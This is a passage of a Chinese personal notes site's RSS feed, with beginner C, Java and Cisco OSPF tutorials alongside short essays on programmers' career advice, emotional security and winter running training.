#include &amp;lt;iostream&amp;gt; int main(void){ // arr 是数组的名字，5 表示数组中，元素的个数，  int arr[5] = {1,2,3,4,5};  printf(&amp;#34;%d\n&amp;#34;,arr[4]); } 在 C 语言中，一个数组的名字是这个数组第一个元素的指针地址。
特点 数组是连续的、线性的，在内存中亦是如此。
数组的数量，一旦定义，无法修改。
数组的类型取决于该数组存储的元素的类型。
优点 存取速度快。
缺点 需要一个连续的、很大的内存。
插入和删除元素的效率很低。</description>
    </item>
    
    <item>
      <title>C 指针的使用</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Sat, 19 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
      <description>指针的使用 互换两个数字 #include &amp;lt;stdio.h&amp;gt;//*p = 1 *q = 5 void interchange(int * p,int * q) { // 将 t 作为两个值的互换媒介。  int t; // t = 1  t = *p; // *p = 5  *p = *q; // *q = 1  *q = t; } // 因为 *p 和 *q 分别指向于 a 和 b，所以，修改 *p 和 *q，就相当于修改 a 和 b， // 尽管 *p 和 *q 在函数指向完毕后已经被释放，但程序依旧通过 *p 和 *q，分别修改了 a 和b。 // 而 p 和 q，两者和 a 、b，并不一样，因为 p、q 中，存放的是指向 a、b 的地址。 // 由此可得出一个结论，函数的形参和实参， 永远不是一个 int main () {  int a = 1;  int b = 5; // 取 a、b 的地址  interchange(&amp;amp;a,&amp;amp;b);  printf(&amp;#34;a = %d,b = %d&amp;#34;,a,b); } 通过被调函数修改主调函数普通变量的值 函数的实参必须为该普通变量的地址。</description>
    </item>
    
    <item>
      <title>CodeBlocks 的使用</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%B1%89%E5%8C%96-codeblocks/</link>
      <pubDate>Sat, 19 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%B1%89%E5%8C%96-codeblocks/</guid>
      <description>CodeBlocks 的使用 codebooks 快捷键 注释 使用Ctrl + Shift + C快速注释。
使用Ctrl + Shift + X取消注释。
汉化 CodeBlocks 将汉化文件zh_CN.mo放置到路径D:\AppInstallPath\CodeBlocks\share\CodeBlocks\locale\zh_CN（没有文件夹就自行创建）
打开 CodeBlocks，Settings — Environment — View — Internationalization(勾选)，选择Chinese(Simplified)</description>
    </item>
    
    <item>
      <title>C CPU 如何对内存条进行处理</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/cpu-%E5%A6%82%E4%BD%95%E5%AF%B9%E5%86%85%E5%AD%98%E6%9D%A1%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86/</link>
      <pubDate>Thu, 17 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/cpu-%E5%A6%82%E4%BD%95%E5%AF%B9%E5%86%85%E5%AD%98%E6%9D%A1%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86/</guid>
      <description>CPU 如何对内存条进行处理 CUP 处理内存条中的数据时，需要通过控制线（只读或只写）、数据线（数据传输）和地址线（确定将要处理的是哪一个内存单元）处理内存条中的数据。
32 位系统最大支持 4G 内存。
64 位 系统最大支持 192G 内存。</description>
    </item>
    
    <item>
      <title>C 基本类型指针</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E6%8C%87%E9%92%88/</link>
      <pubDate>Thu, 17 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E6%8C%87%E9%92%88/</guid>
      <description>基本类型指针 #include &amp;lt;stdio.h&amp;gt; int main () { 	int * p; // 定义一个指针变量 p，且这个 p 只能存放 int 类型的地址， 	int i = 20; 	p = &amp;amp;i; // &amp;amp;i 表示获取变量 i 的内存地址 //这时候 p 中，存放的就是指向变量 i 的内存地址，则 p 完全等同于 i.  	int j = * p; 	printf(&amp;#34;i = %d ,j = %d \n&amp;#34;,i,j);  	return 0; } 详解 *p #include &amp;lt;iostream&amp;gt;int main() {  int * p;  int i = 5;  p = &amp;amp;i; // p 保存了 i 的地址 // 修改 p 不会影响 i；修改 i 也不会影响 p，因为他们是不同的变量。 // *p = i，此时，修改 *p 就是修改 i，修改 i 就是修改 *p // 更准确的说，*p 是以 p 的内容为地址的变量。  *p = 99;  printf(&amp;#34;i = %d,p = %d \n&amp;#34;,i,*p);  i = 88;  printf(&amp;#34;i = %d,p = %d \n&amp;#34;,i,*p); } </description>
    </item>
    
    <item>
      <title>C 指针</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88/</link>
      <pubDate>Thu, 17 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88/</guid>
      <description>指针 指针是 C 语言的灵魂。
指针是一个地址，地址是内存单元的编号，它是一个从零开始的非负整数；比如在 32 位系统中，地址的取值范围是 0 — 4 G（4095）。
指针本质就是一个操作受限的非负整数。
指针只能进行减法运算，不能进行加乘除等运算。
指针变量是存放编号的变量。
八位（Bit）是一个字节，一个字节就是一个内存单元。
int* 是 指向整型变量的指针，
作用   表示一些复杂的数据结构（树、图）。
  快速的传递数据，并且减少了内存的耗费。
  使函数返回一个以上的值。
  可以直接访问硬件。
  更方便的处理字符串（&amp;rsquo;\0&amp;rsquo;）。
  </description>
    </item>
    
    <item>
      <title>C 星号的含义</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%98%9F%E5%8F%B7%E7%9A%84%E5%90%AB%E4%B9%89/</link>
      <pubDate>Thu, 17 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%98%9F%E5%8F%B7%E7%9A%84%E5%90%AB%E4%B9%89/</guid>
      <description>星号的含义 </description>
    </item>
    
    <item>
      <title>《永恒》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%B0%B8%E6%81%92/</link>
      <pubDate>Sun, 06 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%B0%B8%E6%81%92/</guid>
      <description>《永恒》 </description>
    </item>
    
    <item>
      <title>程序员的酒后真言</title>
      <link>https://note.yxzi.xyz/note/view/society/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E9%85%92%E5%90%8E%E7%9C%9F%E8%A8%80/</link>
      <pubDate>Sun, 16 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/society/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E9%85%92%E5%90%8E%E7%9C%9F%E8%A8%80/</guid>
      <description>程序员的酒后真言 美国最大的论坛 Reddit，曾经有一个热帖。
一个程序员说自己喝醉了，软件工程师已经当了 10 年，心里有好多话想说：我可能会后悔今天说了这些话。
他洋洋洒洒写了一大堆，获得 9700 多个赞。内容很有意思，值得一读。
  职业发展的最好方法是换公司。
  技术栈不重要。技术领域有大约 10-20 条核心原则，重要的是这些原则，技术栈只是落实它们的方法。你如果不熟悉某个技术栈，不需要过度担心。
  工作和人际关系是两回事。有一些公司，我交到了好朋友，但是工作得并不开心；另一些公司，我没有与任何同事建立友谊，但是工作得很开心。
  我总是对经理实话实说。怕什么？他开除我？我会在两周内找到一份新工作。
  如果一家公司的工程师超过 100 人，它的期权可能在未来十年内变得很有价值。对于工程师人数很少的公司，期权一般都是毫无价值。
  好的代码是初级工程师可以理解的代码。伟大的代码可以被第一年的 CS 专业的新生理解。
  作为一名工程师，最被低估的技能是记录。说真的，如果有人可以教我怎么写文档，我会付钱，也许是 1000 美元。
  网上的口水战，几乎都无关紧要，别去参与。
  如果我发现自己是公司里面最厉害的工程师，那就该离开了。
  我们应该雇佣更多的实习生，他们很棒。那些精力充沛的小家伙用他们的想法乱搞。如果他们公开质疑或批评某事，那就更好了。我喜欢实习生。
  技术栈很重要。如果你使用 Python 或 C++ 语言，就会忍不住想做一些非常不同的事情。因为某些工具确实擅长某些工作。
  如果你不确定自己想做什么东西，请使用 Java。这是一种糟糕的编程语言，但几乎无所不能。
  对于初学者来说，最赚钱的编程语言是 SQL，干翻所有其他语言。你只了解 SQL 而不会做其他事情，照样赚钱。人力资源专家的年薪？也许 5 万美元。懂 SQL 的人力资源专家？9 万美元。
  测试很重要，但 TDD （测试驱动的开发）几乎变成了一个邪教。</description>
    </item>
    
    <item>
      <title>C printf</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/printf/</link>
      <pubDate>Tue, 04 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/printf/</guid>
      <description>printf 用于将变量的内容输出到显示器。
直接输出 printf(&amp;#34;字符串&amp;#34;); print(&amp;ldquo;输出控制符&amp;rdquo;,参数) int i = 10;//将数值 10 的二进制代码储存到变量 i 中 。 printf(&amp;#34;%o&amp;#34;, a);//将变量 i（数值 10） 的二进制代码以八进制输出，a 为参数。 printf(&amp;ldquo;输出控制符 1 输出控制符 2&amp;rdquo;,参数 1,参数 2)  int a = 10;  int i = 15;  printf(&amp;#34;%d %d\n&amp;#34;, a, i);//控制符和参数必须一一对应。 printf(&amp;ldquo;输出控制符 非输出控制符&amp;rdquo;,参数) int a = 10;//将数值 10 的二进制代码储存到变量 i 中 。 printf(&amp;#34;%o\n&amp;#34;,a);//将变量 i（数值 10 的二进制代码以八进制输出；\n 为非输出控制符。 C 语言中的所有基本类型以及对应的输出符  int，用%d输出。 long int，用%ld输出。 shot int， char，用%c输出。 float，用%f输出，另外，%.2f表示输出的数保留两位小数。 double，用%lf输出。  </description>
    </item>
    
    <item>
      <title>C scanf</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/scanf/</link>
      <pubDate>Mon, 03 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/scanf/</guid>
      <description>scanf 通过键盘将数据输入到变量中。
将从键盘输入的字符转化为输入控制符所规定类型的数据，然后存入以输入参数的值为地址的变量中。
使用 scanf 之前先使用 printf 提示用户以什么样的方式输入内容。
scanf 中使用非输入控制符时，尽量使用空格，不建议使用其他的符号。
scanf(&amp;ldquo;输入控制符&amp;rdquo;,输入参数) int i; scanf(&amp;#34;%d&amp;#34;,&amp;amp;i);//i&amp;amp; 表示变量 i 的地址，&amp;amp; 是一个取地址符，也就是将输入的整数类型的值放入到变量 i 中。 printf(&amp;#34;%d\n&amp;#34;,i); scanf(&amp;ldquo;非输入控制符 输入控制符&amp;rdquo;,输入参数) int i; scanf(&amp;#34;z%d&amp;#34;,&amp;amp;i);//非输入控制符 z （z 可以是任意值）必须同输入控制符一起输入 。 printf(&amp;#34;i = %d\n&amp;#34;,i); </description>
    </item>
    
    <item>
      <title>C switch</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/switch/</link>
      <pubDate>Mon, 03 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/switch/</guid>
      <description>switch 它是一种选择控制语句。
switch 是选择控制语句，而不是循环控制语句，如果在 switch 中出现了 berak 语句，该语句的功
能只是退出 switch 语句并转去执行这个 switch 下面的语句。
在 switch 中，出现 continue 是错误的，除非当前 switch 在 for 或 while 之中。
当我们使用它时，它会去寻找与表达式结果所匹
的子表达式（case），并执行子表达式后面的所有
语句，直到遇到 break 停止执行。
#include &amp;lt;stdio.h&amp;gt; int main () {  char fraction ; 	printf(&amp;#34;请输入您的等级：&amp;#34;); 	scanf(&amp;#34;%c&amp;#34;, &amp;amp;fraction); 	// 测试请键入 A 	switch(fraction) { 	case &amp;#39;A&amp;#39; : 	printf(&amp;#34;很棒！\n&amp;#34; ); 	case &amp;#39;B&amp;#39; : 	printf(&amp;#34;还不错哦\n&amp;#34; ); 	case &amp;#39;C&amp;#39; : 	printf(&amp;#34;做得好\n&amp;#34; ); 	break; 	case &amp;#39;D&amp;#39; : 	printf(&amp;#34;您通过了\n&amp;#34; ); 	break; 	case &amp;#39;F&amp;#39; : 	printf(&amp;#34;最好再试一下\n&amp;#34; ); 	break; 	default : 	printf(&amp;#34;无效的成绩\n&amp;#34; ); 	} 	printf(&amp;#34;您的等级是 %c\n&amp;#34;, fraction);  	return 0;  } 当我们键入 A 时，会发现程序不仅仅执行了与主</description>
    </item>
    
    <item>
      <title>一个人的安全感源于</title>
      <link>https://note.yxzi.xyz/note/view/gam/%E4%B8%80%E4%B8%AA%E4%BA%BA%E7%9A%84%E5%AE%89%E5%85%A8%E6%84%9F%E6%BA%90%E4%BA%8E/</link>
      <pubDate>Sat, 25 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/gam/%E4%B8%80%E4%B8%AA%E4%BA%BA%E7%9A%84%E5%AE%89%E5%85%A8%E6%84%9F%E6%BA%90%E4%BA%8E/</guid>
      <description>一个人的安全感源于 我想说一句特别扎心真实的话：所谓那些要让自己十分独立，强大到谁都不需要依赖的情况，根本不能带来安全感。
这个逻辑真的超级简单——你让自己变得谁都不需要依赖，然后时刻靠着“我谁都不需要”的想法来支撑自己，
就算进入到一段关系当中也不放心对方，依旧活的跟自己一个人生活一样&amp;hellip;这不就是一个很没有安全感的人，才会做出来的表现么？
我相信和这样的人谈过恋爱的人，一定深有体会：
这个人特别懂事，特别独立，有什么问题都自己解决，有什么负面情绪都自己消化，好像这个人没有你也可以过的很好。
是，你的确省事了，这个人也的确懂事，可是问题就在于：
你从来走不进这个人的内心，不是么？因为这人，一直在预设你离开了怎么办。
所以我觉得过分强调自己的独立，过分让自己不需要和对方发生关系，难道不就是因为十分没有安全感，所以十分害怕对方的离开，
因此才不和对方发生任何亲密接触，早早地关闭自己的内心么？
那安全感来自哪里？
我觉得安全感并不来自于“我不需要”，而是来自于“就算失去了，我还有从头再来的勇气”。
不知道看过电影《1942》的朋友有没有印象，在大灾之年到来的时候，过去的老东家落魄成了要饭逃荒的人，但是他还有底气说出来：
“我知道怎么从穷变富，再过上二十年，我还是东家。”
这种失去了一切之后，依然有重头再来的自信的人，才是真正有安全感：失去痛苦么？太痛苦了。
但是没关系，只要你让我站住脚，让我缓过来，我照样有本事和底气重头再来。
所以我觉得对应在感情当中，一个真正有安全感的人应该是这个样子的：
遇到喜欢的人，大胆追求，完全不在乎这样会不会显得自己太主动，
完全不在乎自己会不会表现的太积极，反正就算被拒绝了也无所谓，不喜欢我未必一定是我的原因；
在一起了之后，就好好相处，该依赖对方的依赖，该走心的就走心，完全和对方真心相处，无所保留；
分开了之后，该哭就哭，该难受就难受，绝对不假装坚强，也不强撑着说自己没事，
等到走出来了，缓过来之后，收拾好心态去找下一位。
没有什么“再也不相信爱情了”“再也不会付出那么多了”“不要依赖任何人”的感慨，
因为他们清楚的知道自己值得被爱，自己能够找到更好的，他们完全有能力开启一段新的感情。
我们努力学习，努力工作，让自己的生活变得充实，绝对不是为了把别人排斥在外面，然后不停地告诉自己“我不需要”别人。
我觉得我们这么努力的目的，是为了当我们遇到可以爱，值得爱的人的时候，我们能够大胆的行动；
如果这段感情失败了，我们也完全可以从头再来。
所以安全感其实来自于建立的从头再来的底气，安全感恰恰来自于足够的自信。
 “我有足够的实力，我可以东山再起”和“我有足够的实力，我不需要任何人”这两者之间，我觉得还是有本质上的差别的。
所以请千万不要产生什么误解，把“我不需要别人”当做自己安全感的来源，我觉得这真的是很错误的想法：
因为那不是安全感，那是在回避问题，那是用封闭自己内心的方式为自己建造了一个根本不属于自己的堡垒，
自己躲在堡垒里面，自欺欺人的表示很安全。
安全感应该来自于你实力带给自己的，高度的自我认同：
你相信自己很好，你相信自己值得被肯定，值得被爱，你更明确的知道哪怕不好的事情发生在你身上，你也可以很快东山再起。
所以，当一个人告诉我“我很强大，我不需要依赖任何人，我没有期望所以也不会失望”的时候，
我不会觉得这个人有很强的安全感，我反而会很心疼这种人——这个人一定经历了什么不好的事情，所以戒备心这么重。
我希望看到的是，大家可以特别轻松的表示“无所谓，逢山开路遇水搭桥，实在不行也当体验过程了，失败了重新开始就好”。
所以，不要躲在那个自我封闭的堡垒当中了，走出来吧。
当你不需要盔甲的时候，你才变得真正足够自信，足够强大，足够有安全感。</description>
    </item>
    
    <item>
      <title>跑步训练</title>
      <link>https://note.yxzi.xyz/note/view/grow/%E8%B7%91%E6%AD%A5%E8%AE%AD%E7%BB%83/</link>
      <pubDate>Sat, 25 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/grow/%E8%B7%91%E6%AD%A5%E8%AE%AD%E7%BB%83/</guid>
      <description>跑步训练 冬天跑步，不问配速，不管里程，能坚持，就是万岁。
在我的心目中，冬训，求稳，不受伤即可。
如果放之任之，三天打鱼两天晒网，到了来年开春不仅身体发福，跑起来也够呛。
那么，冬训我们该如何跑呢？
适量 冬天多跑轻松有氧，适当地堆堆跑量是没有问题的，但一定要适量，遵循循序渐进的原则，
平常日常拉练 10 - 15 公里，在身体的承受范围之内即可。
跑量是基础，没有足够的跑量打底，全马是无从谈起的。
稳速 业余爱好者，最大的问题是：快又快不上去，慢又慢不下来；时而快，时而慢，节奏混乱。
不管半马还是全马，讲究个人节奏感，匀速为主；
绝不是仗着体力充沛，肆意冲刺，以至于精疲力竭。
今天有氧慢跑，速度绝不能快；明天间歇冲刺，就不能保存实力；该慢则慢，不硬撑；该快则快，不保留。
我们进行速度训练的时候，假如我们一周跑四次，那么有三次都是以有氧慢跑为主，进行预热、调节、恢复，
只为腾出足够的精力，进行速度训练，否则次次强度训练打底，身体肯定吃不消！
有氧是主食，速度训练只是调味剂，一周一次，刚刚好。即便跑速度，也要稳速，绝不是有多快冲多快。
拿 10 x 1000 米间歇举例，前 3 组，可以稍慢点儿，保存好体力，坚持跑完最后一组，
否则跑到第 5 组，原本 400 配速的间歇，掉到了 430，这就失去了速度训练的意义。
一定要稳，保存好体力，细水长流，才能坚持到最后。
力量 力量训练是大多数业余爱好者的短板，我们很少安排时间进行力量的强化训练。
专业跑者一般一周一次，45 分钟左右，像一般的业余跑者，习惯路跑，很少有练力量的习惯。
如果你想提升成绩，首先要让腿部有劲，包括我们日常拉练，也是练腿，但效果远不如，针对性的强化训练。
我们先进行徒手力量训练，深蹲、蛙跳、箭步蹲练腿；腰腹挺举练腰腹；单杆双杆练上肢；平板支撑练核心&amp;hellip;
随着能力提升，可以借助器材进行强化，比如哑铃深蹲、哑铃箭步蹲等等，
但务必不要用力过猛，操之过急。</description>
    </item>
    
    <item>
      <title>库，框架，架构，平台的区别</title>
      <link>https://note.yxzi.xyz/note/technology/frame/%E5%BA%93%E6%A1%86%E6%9E%B6%E6%9E%B6%E6%9E%84%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Tue, 21 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/%E5%BA%93%E6%A1%86%E6%9E%B6%E6%9E%B6%E6%9E%84%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>库，框架，架构，平台的区别 库（Library） 库是一系列预先编写好的代码集合，供开发者在编程中调用，大大减少重复工作量。
库的概念很宽泛。
程序员第一次输出 Hello World 用的 printf 就来自 C 语言标准库；
各种 SDK 都是库；
从 npm、Maven、Nuget 下载的包都是库；
你自己写一个字符串处理函数，包装好之后调用，也是库。
框架（Framework） 框架是库的一种。很多人会把框架和普通库的区别仅仅理解为规模和复杂度，其实不然。
jQuery 的规模够大了，但仍然是库，不是框架。
框架的最大特征是它会接管程序的主控制流，开发者只需编写业务逻辑代码，具体执行工作由框架来调用。实践中经常会用到控制反转（IoC）以及模板类继承等方式。
比如用 Spring 开发 Web 项目，你只需编写 Controller 和配置文件。具体到项目如何启动、如何监听端口、每一次网络请求的响应处理，这些都由框架来实现。
所以一般来说单个项目可以引入很多库，却不能用多个框架。
同时用 jQuery 和 Vue 没问题，但同时用 Vue 和 React 就不行。
因为主控制流只有一个。
架构（Architecture） 架构与前面两个的区别不仅仅是规模更大，而且它是个抽象概念，不涉及具体语言和代码实现。
它可以是编程模式，比如 MVC 架构、MVVM 架构，只是规定了代码如何进行逻辑分离。每种语言都有自己的 MVC 框架；
也可以是客户端形式，比如多年前常谈的 B/S、C/S 架构；
还可以是服务器端结构，比如分布式架构、微服务架构；
再比如说数据库，为了让客户放心你可以吹自己用的是业内顶端的高可用高一致性弹性伸缩多机房异地容灾双活架构（实际是阿里云每月八百块买的）；
等等等等。
所以说架构师的价值并不在于写代码快、Bug 少、熟练使用某些库与框架，而是掌握并评估项目的什么地方适合用什么架构。
大方向一旦出了问题，比写几处错误代码的影响可大多了。
平台（Platform） 平台又是另一回事，区别就在于前三者属于技术领域的概念，平台则属于业务领域的概念。
只要是运行中的程序通过本机或网络 API 对外提供服务，无论是小规模的单个接口、大规模的云端集群服务，都可以称为平台。
操作系统是平台，它提供你的应用程序与硬件、软件、网络交互的渠道；
浏览器是平台，与操作系统的主要区别在于开发语言单一、权限控制较严；
各互联网服务商自然是平台，提供物理主机、虚拟主机、云主机、容器、Serverless 等等并通过网络进行部署和访问；
以及常见的通知推送平台、短信平台、统计分析平台等等等。
 当然，以上所有概念在网上经常出现混淆，但也不算什么严重的错误。</description>
    </item>
    
    <item>
      <title>Java IO 流</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/io-%E6%B5%81/</link>
      <pubDate>Sun, 19 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/io-%E6%B5%81/</guid>
      <description>IO 流 import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream;  public class ShuRuShuChu {  public static void main(String[]args) throws Exception { //写入  String str=&amp;#34;写入成功！&amp;#34;;  File xieru=new File(&amp;#34;C:\\Users\\admin\\Desktop\\期末考试\\李白.txt&amp;#34;);  FileOutputStream fos=new FileOutputStream(xieru,true);  byte[] words=str.getBytes();  fos.write(words,0,words.length);  //读取  File file2 = new File(&amp;#34;C:\\Users\\admin\\Desktop\\期末考试\\李白.txt&amp;#34;);  FileInputStream fis = new FileInputStream(file2);  byte[] b = new byte[1024];  int len = fis.read(b);  while (len != -1) {  String data = new String(b);  System.</description>
    </item>
    
    <item>
      <title>Java 卖票问题</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/%E5%8D%96%E7%A5%A8%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sun, 19 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/%E5%8D%96%E7%A5%A8%E9%97%AE%E9%A2%98/</guid>
      <description>卖票 Ticket Class public class Ticket {  public static int chepiao = 1000;  public String name;  public String a = new String(&amp;#34;222&amp;#34;);   public Ticket(String name) {  this.name = name;  }   public void run() {  while (true) {  synchronized (a) {  if (chepiao &amp;gt; 0) {  System.out.println(this.name + &amp;#34;正在卖第&amp;#34; + (1001 - chepiao) + &amp;#34;张票&amp;#34;);  chepiao--;  } else {  break;  }  }   }  } } ThreadOne Class public class ThreadOne implements Runnable {  public static int chepiao = 1000;  public String name;  public static String aa = new String(&amp;#34;111&amp;#34;);   public ThreadOne(String name) {  this.</description>
    </item>
    
    <item>
      <title>Java 生产者消费者模式</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Sun, 19 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E6%A8%A1%E5%BC%8F/</guid>
      <description>生产者消费者模式 工厂类 public class Factory {  int num=0;   //库存 // 开始生产  public synchronized void addProduct() throws InterruptedException {  if(num &amp;gt;= 10){  System.out.println(&amp;#34;库存已满，不能再生产了!&amp;#34;);  //强制当前线程等待，知道其他线程在同一个对象调用notify()方法后释放  this.wait();  }else {  Thread.sleep(1000);  num++; //生产出商品  System.out.println(&amp;#34;生产者生产了一个商品，当前库存为: &amp;#34; + num);  //唤醒消费商品的线程  this.notify();  }  }  //开始消费  public synchronized void subProduct() throws InterruptedException {  if(num == 0){  System.out.println(&amp;#34;商品已经被抢光了！请等待补货...&amp;#34;);  this.</description>
    </item>
    
    <item>
      <title>Java 继承</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/%E7%BB%A7%E6%89%BF/</link>
      <pubDate>Sun, 19 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/%E7%BB%A7%E6%89%BF/</guid>
      <description>继承 Phone Class public class Phone extends Dianhua implements Mp3 {  public void playmusic(){  System.out.println(&amp;#34;播放音乐&amp;#34;);  }  public void call(){  System.out.println(&amp;#34;可以打电话&amp;#34;);  }  public void dh(){  System.out.println(&amp;#34;可以高得地图导航&amp;#34;);  } } Telephone Class public abstract class Telephone {  public abstract void call();  public abstract void dh(); } Mp3 Interface public interface Mp3 {  abstract void playmusic(); } Test Class public class Test {  public static void main(String[] args) {  Phone c=new Phone();  c.</description>
    </item>
    
    <item>
      <title>Cisco 配置单区域 OSPFv2</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E5%8D%95%E5%8C%BA%E5%9F%9F-ospfv2/</link>
      <pubDate>Sun, 12 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E5%8D%95%E5%8C%BA%E5%9F%9F-ospfv2/</guid>
      <description>配置单区域 OSPFv2 配置 R1 enableconfigure terminalrouter ospf 10router-id 1.1.1.1network 172.16.1.0 0.0.0.255 area 0network 172.16.3.0 0.0.0.3 area 0network 192.168.10.4 0.0.0.3 area 0passive-interface GigabitEthernet0/0 配置 R2 enableconfigure terminalrouter ospf 10router-id 2.2.2.2network 172.16.2.0 0.0.0.255 area 0network 172.16.3.0 0.0.0.3 area 0network 192.168.10.8 0.0.0.3 area 0passive-interface GigabitEthernet0/0 配置 R3 enableconfigure terminalrouter ospf 10router-id 3.3.3.3network 192.168.1.0 0.0.0.255 area 0network 192.</description>
    </item>
    
    <item>
      <title>Css 选择器</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E9%80%89%E6%8B%A9%E5%99%A8/</link>
      <pubDate>Sun, 12 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E9%80%89%E6%8B%A9%E5%99%A8/</guid>
      <description>选择器 ID 选择器，尽量少用，</description>
    </item>
    
    <item>
      <title>OSPF 协议</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/ospf-%E5%8D%8F%E8%AE%AE/</link>
      <pubDate>Thu, 09 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/ospf-%E5%8D%8F%E8%AE%AE/</guid>
      <description>OSPF 协议 OSPF 是目前网络界耳熟能详的协议了。
用带宽来判断路径的优劣弥补了 RIP 的缺陷（光凭带宽也不是很好），同时使用划分区域网络，可以更好的控制管理和扩展网络。
还有各种小特点比如 DR、BDR 机制，和适合不同网络类型机制，以及使用不同 LSA 传递各种信息，各种 LSA 的特性也不通。
所有综合来讲 OSPF 是比较适合大众选择的一款路由协议
router ospf 10 配置 OSPF 路由，进程 ID 为 10
router-id 1.1.1.1 配置路由器的路由器 ID
子网掩码的反掩码 IP 地址：192.168.10.8/30，那么它的子网掩码为 255.255.255.252
则它的子网掩码的反掩码为 255.255.255.255 减去 255.255.255.252 等于 0.0.0.3，
即配置 OSPFv2 的网络通告为：
network 192.168.10.8 0.0.0.3 area 0 其中 area 是自治系统区域的标识</description>
    </item>
    
    <item>
      <title>交换机</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E4%BA%A4%E6%8D%A2%E6%9C%BA/</link>
      <pubDate>Thu, 09 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E4%BA%A4%E6%8D%A2%E6%9C%BA/</guid>
      <description>交换机 Trunk 和 Access trunk 行通过多个 VLAN。
access 只允许通通过单个 VLAN。</description>
    </item>
    
    <item>
      <title>Cisco 静态和动态路由的优缺点</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%9D%99%E6%80%81%E5%92%8C%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/</link>
      <pubDate>Tue, 07 Dec 2021 00:00:00 +0000</pubDate>
      
